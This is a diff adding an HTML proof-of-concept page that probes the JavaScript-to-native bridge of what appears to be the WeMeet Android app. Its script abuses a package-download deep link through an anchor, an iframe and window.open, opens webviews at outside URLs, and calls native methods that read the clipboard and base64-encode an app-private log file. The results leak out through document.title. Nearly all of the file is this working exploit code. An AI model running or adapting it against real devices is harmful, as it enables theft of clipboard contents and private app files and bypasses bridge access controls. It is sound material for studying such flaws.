@@ -1,0 +1,77 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P11</h1>
+<p id="l">P11</p>
+<script>
+document.title='P11-START';
+function note(t){ document.title=String(t); }
+function call(mod, method, param){
+  if(!window.JSCallJavaMgr){ note('NOJSB'); return; }
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
+    callId:mod+'.'+method
+  }));
+}
+var rows=[];
+function norm(res){
+  if(typeof res==='string'){
+    try{ res=JSON.parse(res); }catch(e){ return {callId:'RAW', code:-1, message:String(res).slice(0,60)}; }
+  }
+  return res||{};
+}
+window.__wmpoc=function(res){
+  res=norm(res);
+  var msg=String(res.message||'');
+  var deny=msg.indexOf('URL denied')>=0 || msg.indexOf('not config')>=0 || msg.indexOf('webpage config is empty')>=0;
+  rows.push((deny?'D':'A')+':'+(res.callId||'?')+':'+res.code+':'+msg.replace(/\|/g,'/').slice(0,40));
+};
+var pkg='wemeet://page/package_download?url='+encodeURIComponent('https://httpbin.org/bytes/64');
+var steps=[
+  function(){ note('JSB='+!!window.JSCallJavaMgr); },
+  function(){
+    note('P11-A-DL');
+    var a=document.createElement('a');
+    a.href=pkg;
+    a.setAttribute('download','x.bin');
+    a.click();
+  },
+  function(){
+    note('P11-IFRAME-PKG');
+    var f=document.createElement('iframe');
+    f.src=pkg;
+    document.body.appendChild(f);
+  },
+  function(){
+    note('P11-WINOPEN-PKG');
+    try{ window.open(pkg); }catch(e){ rows.push('EX:open'); }
+  },
+  function(){ call('CommonPlugin','InitMidasSDK',{offer_id:'1450000105',open_id:'x',open_key:'x',session_id:'hy_gameid',session_type:'st_dummy',pf:'desktop_m_qq-73213123-html5-2011',pf_key:'pfKey'}); },
+  function(){ call('CommonPlugin','OpenNewPage',{url:'https://httpbin.org/html'}); },
+  function(){ call('CommonPlugin','CreateWebview',{url:'https://httpbin.org/html'}); },
+  function(){ call('CommonPlugin','LoadUrlByTemplate',{url:'https://httpbin.org/html'}); },
+  function(){ call('UIPlugin','OpenNewPage',{url:'https://httpbin.org/html'}); },
+  function(){ call('CommonPlugin','GetClipboardData',{}); },
+  function(){ call('CommonPlugin','GetFileBase64',{path:'/data/data/com.tencent.wemeet.app/files/infiltrator_logs/infiltrator.log'}); }
+];
+var i=0;
+function dump(){
+  if(!rows.length){ note('CB P11-EMPTY'); return; }
+  var blob=rows.join('|');
+  var n=0, p=0;
+  function chunk(){
+    if(p>=blob.length){ note('CB P11-DONE n='+rows.length); return; }
+    note('CB '+n+' '+blob.slice(p,p+90));
+    p+=90; n++;
+    setTimeout(chunk, 1200);
+  }
+  chunk();
+}
+function next(){
+  if(i>=steps.length){ setTimeout(dump, 1600); return; }
+  try{ steps[i](); }catch(e){ rows.push('EX:'+e); }
+  i++;
+  setTimeout(next, 900);
+}
+setTimeout(next, 400);
+</script>
+</body></html>
